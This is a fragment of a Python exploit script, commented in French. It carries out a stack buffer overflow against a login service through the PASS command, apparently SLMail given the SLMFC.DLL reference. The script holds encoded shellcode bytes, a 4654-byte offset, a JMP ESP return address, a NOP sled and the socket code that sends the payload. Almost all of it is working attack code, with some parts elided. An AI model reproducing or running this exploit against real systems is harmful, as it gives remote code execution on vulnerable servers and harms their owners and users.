...
shellcode =  b""
shellcode += b"\xda\xc2\xbd\x84\x76\x77\x95\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x59\x83\xeb\xfc\x31\x6b\x15"
shellcode += b"\x03\x6b\x15\x66\x83\x8b\x7d\xe9\x6c\x74\x7e"
shellcode += b"\x95\xe5\x91\x4f\x87\x92\xd2\xe2\x17\xd0\xb7"
shellcode += b"\x0e\xdc\xb4\x23\x84\x90\x10\x7d\x65\x5b\xd6"
shellcode += b"\x37\xbf\x52\xd8\x64\x83\xf5\xa4\x76\xd0\xd5"
shellcode += b"\x95\xb8\x25\x14\xd1\x0e\x43\xf9\x8f\xc7\x20"
shellcode += b"\x57\x20\x63\x74\x6b\x41\xa3\xf2\xd3\x39\xc6"
shellcode += b"\xc5\xa7\xf5\xc9\x15\x17\x8d\x92\xb5\x96\x42"
shellcode += b"\xa9\xfe\x80\xe1\x67\x8a\x8c\xa0\xfc\x47\x67"
shellcode += b"\x33\xd5\x99\x88\x05\x19\x18\xb9\x6b\x35\x9a"
shellcode += b"\x82\x4c\xa5\xe8\xf8\xae\x58\xeb\x3b\xcc\x86"
shellcode += b"\x7e\xdb\x76\x4c\xd8\x3f\x86\x81\xbf\xb4\x84"
shellcode += b"\x6e\xcb\x92\x88\x71\x18\xa9\xb5\xfa\x9f\x7d"
shellcode += b"\x3c\xb8\xbb\x59\x64\x1a\xa5\xf8\xc0\xcd\xda"
shellcode += b"\x1a\xac\xb2\x7e\x51\x5f\xa4\xff\x9a\x9f\xc9"
shellcode += b"\x5d\x0c\x53\x04\x5e\xcc\xfb\x1f\x2d\xfe\xa4"
shellcode += b"\x8b\xb9\xb2\x2d\x12\x3d\xc3\x3a\xa5\x91\x6b"
shellcode += b"\x2a\x5b\x12\x8b\x62\x98\x46\xdb\x1c\x09\xe7"
shellcode += b"\xb0\xdc\xb6\x32\x2c\xd7\x20\x7d\x18\xe6\xa4"
shellcode += b"\x15\x5a\xe9\xd5\xb9\xd3\x0f\x85\x11\xb3\x9f"
shellcode += b"\x66\xc2\x73\x70\x0f\x08\x7c\xaf\x2f\x33\x57"
shellcode += b"\xd8\xda\xdc\x01\xb0\x72\x44\x08\x4a\xe2\x89"
shellcode += b"\x87\x36\x24\x01\x2d\xc6\xeb\xe2\x44\xd4\x1c"
shellcode += b"\x95\xa6\x24\xdd\x30\xa6\x4e\xd9\x92\xf1\xe6"
shellcode += b"\xe3\xc3\x35\xa9\x1c\x26\x46\xae\xe3\xb7\x7e"
shellcode += b"\xc4\xd2\x2d\x3e\xb2\x1a\xa2\xbe\x42\x4d\xa8"
shellcode += b"\xbe\x2a\x29\x88\xed\x4f\x36\x05\x82\xc3\xa3"
shellcode += b"\xa6\xf2\xb0\x64\xcf\xf8\xef\x43\x50\x03\xda"
shellcode += b"\xd7\x97\xfb\x98\xff\x3f\x93\x62\x40\xc0\x63"
shellcode += b"\x09\x40\x90\x0b\xc6\x6f\x1f\xfb\x27\xba\x48"
shellcode += b"\x93\xa2\x2b\x3a\x02\xb2\x61\x9a\x9a\xb3\x86"
shellcode += b"\x07\x2d\xc9\xe7\xb8\xce\x2e\xee\xdc\xcf\x2e"
shellcode += b"\x0e\xe3\xec\xf8\x37\x91\x33\x39\x0c\xaa\x06"
shellcode += b"\x1c\x25\x21\x68\x32\x35\x60"

#4654 caracteres avant adresse de retour
#01BCA154 contenu de SP qui pointe vers le shellcode 
#5F4A358F JMP ESP dans le module SLMFC.DLL

buf = 'A'*4654 +'\x8f\x35\x4a\x5f'+'\x90'*16+shellcode
#buf = '\x90'*20 + shellcode + 'A'*(4654-20-len(shellcode))+'BBBB'+'C'*500

#buf+=""
...
try:
	...
	rep=s.recv(4000)
	print("rep : "+rep)
	print("envoi du buffer a l'espace resereve pour USER..")
	s.send("USER aymen \r\n")
	rep=s.recv(4000)
	print("rep : "+rep)
	print("envoi du buffer a l'espace resereve pour PASS..")
	s.send("PASS "+buf+" \r\n")
	rep=s.recv(4000)
	print("rep : "+rep)
